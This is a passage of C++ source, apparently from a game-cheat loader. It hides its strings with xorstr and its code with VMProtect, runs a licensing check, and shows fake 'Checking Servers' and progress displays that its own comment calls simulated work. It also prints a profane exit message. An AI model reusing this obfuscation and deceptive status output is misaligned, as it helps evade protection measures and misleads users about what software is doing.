		std::cerr << "GO FUCK URSELF, CONTACT STAFF!" << std::endl;
		Sleep(4000);
		exit(0);// Exit if the hidden file exists
	}
	HANDLE hConsole1 = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole1, 4);
	std::cout << xorstr_("\n\n                                                   Checking Servers ...");
	Sleep(1500);

	if (VMProtectIsValidImageCRC)
	{

		VMProtectBeginUltra("Diddyauth"); //vmp main
		std::string vmpstatus = VMProtectIsProtected() ? " Protected " : " PROTECTED VERSION: 404959328.49 "; //If not protected, auth can be bypassed. When you press VMP, VMProtectSDK64.dll will not be needed.

		if (Game->woofs() != GAME_INFORMATION::woofssuc) ExitProcess(0);
		 
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		system(xorstr_("cls"));
		SetConsoleTextAttribute(hConsole, 4);
		std::cout << xorstr_("\n\n                                              Loader Status") << vmpstatus << std::endl;
		Sleep(1000);
		system("cls");
		SetConsoleTextAttribute(hConsole, 6);
		loadingAnimation();
		printf("\n");
		std::cout << c_xor("[+] Initializing...") << std::endl;
		for (int i = 0; i <= 100; i += 10) {
			showProgressBar(i);
			Sleep(100); // Simulate work
		}
		std::cout << std::endl;
		/*auth_instance.init();*/
		Sleep(500);
		system("cls");
		SetConsoleTextAttribute(hConsole, 2);
		std::cout << xorstr_("\n\n\n\n                                                        Done !");
		mouse_interface();
		//int option;

		  
		asdasdasdsadasdas();

		VMProtectEnd();
	}

}

